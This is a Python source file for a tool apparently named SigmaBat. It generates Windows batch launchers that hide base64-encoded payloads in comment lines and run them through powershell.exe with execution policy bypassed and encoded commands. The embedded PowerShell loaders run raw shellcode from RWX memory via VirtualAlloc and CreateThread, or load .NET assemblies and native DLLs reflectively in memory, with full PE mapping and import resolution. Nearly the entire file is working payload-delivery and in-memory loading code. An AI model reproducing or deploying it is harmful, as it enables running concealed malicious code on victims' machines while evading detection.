import base64


CHUNK_SIZE = 3000

SHELLCODE_LOADER = r"""
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$b64 = $env:SIGMABAT_SHELLCODE_B64

if ([string]::IsNullOrWhiteSpace($b64)) {
    throw 'SIGMABAT_SHELLCODE_B64 is empty.'
}

$bytes = [Convert]::FromBase64String($b64)

[Console]::WriteLine("[SigmaBat] shellcode bytes loaded: {0}", $bytes.Length)

Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", SetLastError=true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

$size = [UIntPtr]::new([uint64]$bytes.Length)
$mem = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
if ($mem -eq [IntPtr]::Zero) {
    throw 'VirtualAlloc failed.'
}

[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $bytes.Length)

$threadId = 0
$thread = [NativeMethods]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $mem, [IntPtr]::Zero, 0, [ref]$threadId)
if ($thread -eq [IntPtr]::Zero) {
    throw 'CreateThread failed.'
}

[void][NativeMethods]::WaitForSingleObject($thread, 4294967295)
[void][NativeMethods]::CloseHandle($thread)

[Console]::WriteLine("[SigmaBat] shellcode execution completed.")
"""

POWERSHELL_LOADER = r"""
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'
$b64 = $script:SIGMABAT_B64_INLINE
if ([string]::IsNullOrWhiteSpace($b64)) {
    $b64 = $env:SIGMABAT_B64
}
$symbol = $env:SIGMABAT_SYMBOL
$mode = $env:SIGMABAT_MODE

if ([string]::IsNullOrWhiteSpace($b64)) {
    throw 'SIGMABAT_B64 is empty.'
}

$bytes = [Convert]::FromBase64String($b64)

[Console]::WriteLine("[SigmaBat] mode: {0}", $mode)
[Console]::WriteLine("[SigmaBat] payload bytes loaded: {0}", $bytes.Length)

if ($mode -ne 'managed_exe' -and [string]::IsNullOrWhiteSpace($symbol)) {
    throw 'SIGMABAT_SYMBOL is empty.'
}

$bindingFlags = [System.Reflection.BindingFlags]'Public,NonPublic,Static'

function Invoke-ManagedFunction {
    param(
        [System.Reflection.Assembly]$Assembly,
        [string]$Name
    )

    $candidates = foreach ($type in $Assembly.GetTypes()) {
        $type.GetMethods($bindingFlags) | Where-Object { $_.Name -eq $Name }
    }

    if (-not $candidates) {
        throw "Managed function '$Name' was not found."
    }

    $method = $candidates | Where-Object { $_.GetParameters().Count -eq 0 } | Select-Object -First 1
    if (-not $method) {
        $method = $candidates | Where-Object {
            $params = $_.GetParameters()
            $params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]
        } | Select-Object -First 1
    }

    if (-not $method) {
        throw "Managed function '$Name' exists, but its signature is not supported."
    }

    if ($method.GetParameters().Count -eq 0) {
        return $method.Invoke($null, @())
    }
    else {
        return $method.Invoke($null, (,([string[]]@())))
    }
}

function Invoke-ManagedEntryPoint {
    param(
        [System.Reflection.Assembly]$Assembly
    )

    $entryPoint = $Assembly.EntryPoint
    if (-not $entryPoint) {
        throw 'Managed assembly has no entry point.'
    }

    $params = $entryPoint.GetParameters()
    if ($params.Count -eq 0) {
        return $entryPoint.Invoke($null, @())
    }

    if ($params.Count -eq 1 -and $params[0].ParameterType -eq [string[]]) {
        return $entryPoint.Invoke($null, (,([string[]]@())))
    }

    throw 'Managed entry point signature is not supported.'
}

function Invoke-NativeFunction {
    param(
        [byte[]]$Bytes,
        [string]$Name
    )

    [Console]::WriteLine("[SigmaBat] native: preparing in-memory loader...")
    [Console]::WriteLine("[SigmaBat] native: target export '{0}'", $Name)

    Add-Type @"
using System;
using System.IO;
using System.Runtime.InteropServices;

public static class InMemLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    private static extern IntPtr LoadLibraryA(string lpFileName);

    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint MEM_RELEASE = 0x8000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
    private const uint IMAGE_NT_SIGNATURE = 0x00004550;
    private const ushort PE32_MAGIC = 0x10B;
    private const ushort PE32_PLUS_MAGIC = 0x20B;
    private const ushort IMAGE_REL_BASED_HIGHLOW = 3;
    private const ushort IMAGE_REL_BASED_DIR64 = 10;
    private const uint DLL_PROCESS_ATTACH = 1;

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_BASE_RELOCATION
    {
        public uint VirtualAddress;
        public uint SizeOfBlock;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct IMAGE_IMPORT_DESCRIPTOR
    {
        public uint OriginalFirstThunk;
        public uint TimeDateStamp;
        public uint ForwarderChain;
        public uint Name;
        public uint FirstThunk;
    }

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate int DllMainDelegate(IntPtr hModule, uint reason, IntPtr reserved);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    private delegate void ExportDelegate();

    public static void LoadAndRun(byte[] dllData, string funcName)
    {
        if (dllData == null || dllData.Length < 0x100)
        {
            throw new InvalidOperationException("Native DLL payload is empty.");
        }

        BinaryReader br = new BinaryReader(new MemoryStream(dllData));
        ushort numberOfSections;
        uint addressOfEntryPoint;
        ulong imageBase;
        uint sizeOfImage;
        uint sizeOfHeaders;
        bool is64;
        uint importRva;
        uint importSize;
        uint relocRva;
        uint relocSize;
        ushort sizeOfOptionalHeader;
        long optionalOffset;

        try
        {
            if (br.ReadUInt16() != IMAGE_DOS_SIGNATURE)
            {
                throw new InvalidOperationException("Invalid DOS header.");
            }

            br.BaseStream.Position = 0x3C;
            uint peOffset = br.ReadUInt32();
            if (peOffset + 0x18 > dllData.Length)
            {
                throw new InvalidOperationException("PE header is truncated.");
            }

            br.BaseStream.Position = peOffset;
            if (br.ReadUInt32() != IMAGE_NT_SIGNATURE)
            {
                throw new InvalidOperationException("Invalid NT header.");
            }

            br.BaseStream.Position = peOffset + 4;
            br.ReadUInt16(); // machine
            numberOfSections = br.ReadUInt16();
            br.BaseStream.Position = peOffset + 20;
            sizeOfOptionalHeader = br.ReadUInt16();
            optionalOffset = peOffset + 24;
            br.BaseStream.Position = optionalOffset;
            ushort optionalMagic = br.ReadUInt16();

            is64 = optionalMagic == PE32_PLUS_MAGIC;
            if (!is64 && optionalMagic != PE32_MAGIC)
            {
                throw new InvalidOperationException("Unsupported optional header.");
            }

            br.BaseStream.Position = optionalOffset + 16;
            addressOfEntryPoint = br.ReadUInt32();
            imageBase = is64 ? br.ReadUInt64() : br.ReadUInt32();
            br.BaseStream.Position = optionalOffset + 56;
            sizeOfImage = br.ReadUInt32();
            sizeOfHeaders = br.ReadUInt32();

            int dataDirectoryOffset = is64 ? 112 : 96;
            br.BaseStream.Position = optionalOffset + dataDirectoryOffset + 8;
            importRva = br.ReadUInt32();
            importSize = br.ReadUInt32();
            br.BaseStream.Position = optionalOffset + dataDirectoryOffset + (8 * 5);
            relocRva = br.ReadUInt32();
            relocSize = br.ReadUInt32();
        }
        finally
        {
            br.Dispose();
        }

        IntPtr baseAddr = VirtualAlloc((IntPtr)(long)imageBase, (UIntPtr)sizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (baseAddr == IntPtr.Zero)
        {
            baseAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)sizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        }
        if (baseAddr == IntPtr.Zero)
        {
            throw new InvalidOperationException("VirtualAlloc failed.");
        }

        try
        {
            Marshal.Copy(dllData, 0, baseAddr, (int)Math.Min(sizeOfHeaders, (uint)dllData.Length));

            long sectionOffset = optionalOffset + sizeOfOptionalHeader;
            for (int i = 0; i < numberOfSections; i++)
            {
                long entryOffset = sectionOffset + (40L * i);
                if (entryOffset + 40 > dllData.Length)
                {
                    throw new InvalidOperationException("Section table is truncated.");
                }

                uint virtualSize = BitConverter.ToUInt32(dllData, (int)entryOffset + 8);
                uint virtualAddress = BitConverter.ToUInt32(dllData, (int)entryOffset + 12);
                uint rawSize = BitConverter.ToUInt32(dllData, (int)entryOffset + 16);
                uint rawPointer = BitConverter.ToUInt32(dllData, (int)entryOffset + 20);

                if (rawSize == 0)
                {
                    continue;
                }

                if ((ulong)rawPointer + rawSize > (ulong)dllData.Length)
                {
                    throw new InvalidOperationException("Section payload is out of bounds.");
                }

                IntPtr destination = IntPtr.Add(baseAddr, (int)virtualAddress);
                Marshal.Copy(dllData, (int)rawPointer, destination, (int)rawSize);

                if (virtualSize > rawSize)
                {
                    byte[] padding = new byte[virtualSize - rawSize];
                    Marshal.Copy(padding, 0, IntPtr.Add(destination, (int)rawSize), padding.Length);
                }
            }

            long delta = baseAddr.ToInt64() - unchecked((long)imageBase);
            if (delta != 0 && relocRva != 0 && relocSize != 0)
            {
                IntPtr relocCursor = IntPtr.Add(baseAddr, (int)relocRva);
                IntPtr relocEnd = IntPtr.Add(relocCursor, (int)relocSize);

                while (relocCursor.ToInt64() < relocEnd.ToInt64())
                {
                    IMAGE_BASE_RELOCATION reloc = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(relocCursor);
                    if (reloc.SizeOfBlock < 8)
                    {
                        break;
                    }

                    int entryCount = ((int)reloc.SizeOfBlock - 8) / 2;
                    IntPtr entries = IntPtr.Add(relocCursor, 8);
                    for (int i = 0; i < entryCount; i++)
                    {
                        ushort entry = (ushort)Marshal.ReadInt16(IntPtr.Add(entries, i * 2));
                        ushort type = (ushort)(entry >> 12);
                        ushort offset = (ushort)(entry & 0x0FFF);
                        IntPtr patchAddress = IntPtr.Add(baseAddr, (int)reloc.VirtualAddress + offset);

                        if (type == IMAGE_REL_BASED_HIGHLOW)
                        {
                            int value = Marshal.ReadInt32(patchAddress);
                            Marshal.WriteInt32(patchAddress, value + (int)delta);
                        }
                        else if (type == IMAGE_REL_BASED_DIR64 && is64)
                        {
                            long value = Marshal.ReadInt64(patchAddress);
                            Marshal.WriteInt64(patchAddress, value + delta);
                        }
                    }

                    relocCursor = IntPtr.Add(relocCursor, (int)reloc.SizeOfBlock);
                }
            }

            if (importRva != 0 && importSize != 0)
            {
                IntPtr importCursor = IntPtr.Add(baseAddr, (int)importRva);
                for (int i = 0; ; i++)
                {
                    IntPtr descriptorPtr = IntPtr.Add(importCursor, i * 20);
                    IMAGE_IMPORT_DESCRIPTOR descriptor = Marshal.PtrToStructure<IMAGE_IMPORT_DESCRIPTOR>(descriptorPtr);
                    if (descriptor.Name == 0)
                    {
                        break;
                    }

                    string dllName = Marshal.PtrToStringAnsi(IntPtr.Add(baseAddr, (int)descriptor.Name));
                    IntPtr moduleHandle = LoadLibraryA(dllName);
                    if (moduleHandle == IntPtr.Zero)
                    {
                        throw new InvalidOperationException("Failed to load dependency: " + dllName);
                    }

                    IntPtr thunk = descriptor.OriginalFirstThunk != 0
                        ? IntPtr.Add(baseAddr, (int)descriptor.OriginalFirstThunk)
                        : IntPtr.Add(baseAddr, (int)descriptor.FirstThunk);
                    IntPtr funcTable = IntPtr.Add(baseAddr, (int)descriptor.FirstThunk);

                    for (int j = 0; ; j++)
                    {
                        if (is64)
                        {
                            ulong thunkValue = (ulong)Marshal.ReadInt64(IntPtr.Add(thunk, j * 8));
                            if (thunkValue == 0)
                            {
                                break;
                            }

                            IntPtr resolved;
                            if ((thunkValue & 0x8000000000000000UL) != 0)
                            {
                                resolved = GetProcAddress(moduleHandle, (thunkValue & 0xFFFF).ToString());
                            }
                            else
                            {
                                string importName = Marshal.PtrToStringAnsi(IntPtr.Add(baseAddr, (int)thunkValue + 2));
                                resolved = GetProcAddress(moduleHandle, importName);
                            }

                            if (resolved == IntPtr.Zero)
                            {
                                throw new InvalidOperationException("Failed to resolve import from " + dllName);
                            }

                            Marshal.WriteInt64(IntPtr.Add(funcTable, j * 8), resolved.ToInt64());
                        }
                        else
                        {
                            uint thunkValue = unchecked((uint)Marshal.ReadInt32(IntPtr.Add(thunk, j * 4)));
                            if (thunkValue == 0)
                            {
                                break;
                            }

                            IntPtr resolved;
                            if ((thunkValue & 0x80000000U) != 0)
                            {
                                resolved = GetProcAddress(moduleHandle, (thunkValue & 0xFFFF).ToString());
                            }
                            else
                            {
                                string importName = Marshal.PtrToStringAnsi(IntPtr.Add(baseAddr, (int)thunkValue + 2));
                                resolved = GetProcAddress(moduleHandle, importName);
                            }

                            if (resolved == IntPtr.Zero)
                            {
                                throw new InvalidOperationException("Failed to resolve import from " + dllName);
                            }

                            Marshal.WriteInt32(IntPtr.Add(funcTable, j * 4), resolved.ToInt32());
                        }
                    }
                }
            }

            if (!FlushInstructionCache(GetCurrentProcess(), baseAddr, (UIntPtr)sizeOfImage))
            {
                throw new InvalidOperationException("FlushInstructionCache failed.");
            }

            if (addressOfEntryPoint != 0)
            {
                IntPtr entryPoint = IntPtr.Add(baseAddr, (int)addressOfEntryPoint);
                DllMainDelegate dllMain = Marshal.GetDelegateForFunctionPointer<DllMainDelegate>(entryPoint);
                int dllMainResult = dllMain(baseAddr, DLL_PROCESS_ATTACH, IntPtr.Zero);
                if (dllMainResult == 0)
                {
                    throw new InvalidOperationException("DllMain returned FALSE.");
                }
            }

            IntPtr exportAddress = GetProcAddress(baseAddr, funcName);
            if (exportAddress == IntPtr.Zero)
            {
                throw new InvalidOperationException("Requested export was not resolved.");
            }

            ExportDelegate exportDelegate = Marshal.GetDelegateForFunctionPointer<ExportDelegate>(exportAddress);
            exportDelegate();
        }
        finally
        {
            VirtualFree(baseAddr, UIntPtr.Zero, MEM_RELEASE);
        }
    }
}
"@

    [Console]::WriteLine("[SigmaBat] native: invoking export...")
    [InMemLoader]::LoadAndRun($Bytes, $Name)
    [Console]::WriteLine("[SigmaBat] native: export call completed.")
    return 0
}

function Convert-ToExitCode {
    param(
        $Value
    )

    if ($null -eq $Value) {
        return 0
    }

    if ($Value -is [int]) {
        return [int]$Value
    }

    if ($Value -is [bool]) {
        if ($Value) { return 0 }
        return 1
    }

    return 0
}

$exitCode = 1
try {
    switch ($mode) {
        'managed' {
            [Console]::WriteLine("[SigmaBat] managed: invoking method '{0}'", $symbol)
            $assembly = [System.Reflection.Assembly]::Load($bytes)
            $result = Invoke-ManagedFunction -Assembly $assembly -Name $symbol
            [Console]::WriteLine("[SigmaBat] managed: invocation completed.")
            $exitCode = Convert-ToExitCode -Value $result
        }
        'managed_exe' {
            [Console]::WriteLine("[SigmaBat] managed_exe: invoking entry point...")
            $assembly = [System.Reflection.Assembly]::Load($bytes)
            $result = Invoke-ManagedEntryPoint -Assembly $assembly
            [Console]::WriteLine("[SigmaBat] managed_exe: entry point completed.")
            $exitCode = Convert-ToExitCode -Value $result
        }
        'native' {
            $exitCode = Invoke-NativeFunction -Bytes $bytes -Name $symbol
        }
        default {
            throw "Unknown DLL mode: $mode"
        }
    }
}
catch {
    [Console]::Error.WriteLine("[SigmaBat] error: {0}", $_.Exception.Message)
    $exitCode = 1
}

[Console]::WriteLine("[SigmaBat] exit code: {0}", $exitCode)
exit $exitCode
"""


def chunk_string(value, size):
    for offset in range(0, len(value), size):
        yield value[offset:offset + size]


def encode_powershell_script(script_text):
    return base64.b64encode(script_text.encode("utf-16le")).decode("ascii")


def escape_batch_value(value):
    escaped = value.replace("^", "^^")
    escaped = escaped.replace("&", "^&")
    escaped = escaped.replace("|", "^|")
    escaped = escaped.replace("<", "^<")
    escaped = escaped.replace(">", "^>")
    escaped = escaped.replace("!", "^!")
    escaped = escaped.replace("%", "%%")
    return escaped


def build_dll_batch_launcher(payload_b64, symbol_name, mode):
    loader_b64 = encode_powershell_script(POWERSHELL_LOADER.strip())
    lines = [
        "@echo off",
        "setlocal EnableExtensions DisableDelayedExpansion",
        f"set \"SIGMABAT_SYMBOL={escape_batch_value(symbol_name)}\"",
        f"set \"SIGMABAT_MODE={escape_batch_value(mode)}\"",
        "set \"SIGMABAT_BATCH=%~f0\"",
    ]

    lines.extend([
        "powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"$batch=$env:SIGMABAT_BATCH;$p=New-Object System.Text.StringBuilder;$l=New-Object System.Text.StringBuilder;$s='';foreach($line in [System.IO.File]::ReadLines($batch)){if($line -eq '::SIGMABAT_PAYLOAD_BEGIN'){$s='p';continue};if($line -eq '::SIGMABAT_PAYLOAD_END'){$s='';continue};if($line -eq '::SIGMABAT_LOADER_BEGIN'){$s='l';continue};if($line -eq '::SIGMABAT_LOADER_END'){$s='';continue};if($line.StartsWith('::DATA ')){if($s -eq 'p'){[void]$p.Append($line.Substring(7))}elseif($s -eq 'l'){[void]$l.Append($line.Substring(7))}}};$script:SIGMABAT_B64_INLINE=$p.ToString();$loader=[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($l.ToString()));& ([ScriptBlock]::Create($loader))\"",
        "if errorlevel 1 exit /b %errorlevel%",
        "goto :eof",
        "::SIGMABAT_PAYLOAD_BEGIN",
    ])

    for chunk in chunk_string(payload_b64, CHUNK_SIZE):
        lines.append(f"::DATA {chunk}")

    lines.extend([
        "::SIGMABAT_PAYLOAD_END",
        "::SIGMABAT_LOADER_BEGIN",
    ])

    for chunk in chunk_string(loader_b64, CHUNK_SIZE):
        lines.append(f"::DATA {chunk}")

    lines.extend([
        "::SIGMABAT_LOADER_END",
        "endlocal",
        "",
    ])

    return "\r\n".join(lines)


def build_managed_exe_batch_launcher(payload_b64):
    return build_dll_batch_launcher(payload_b64, "", "managed_exe")


def build_shellcode_batch_launcher(payload_b64):
    powershell_b64 = encode_powershell_script(SHELLCODE_LOADER.strip())
    lines = [
        "@echo off",
        "setlocal EnableExtensions DisableDelayedExpansion",
        "set \"SIGMABAT_SHELLCODE_B64=\"",
        "echo [SigmaBat] shellcode launcher starting...",
    ]

    for chunk in chunk_string(payload_b64, CHUNK_SIZE):
        lines.append(f'set "SIGMABAT_SHELLCODE_B64=%SIGMABAT_SHELLCODE_B64%{chunk}"')

    lines.extend([
        f"powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {powershell_b64}",
        "if errorlevel 1 exit /b %errorlevel%",
        "echo [SigmaBat] shellcode launcher finished.",
        "endlocal",
        "",
    ])

    return "\r\n".join(lines)
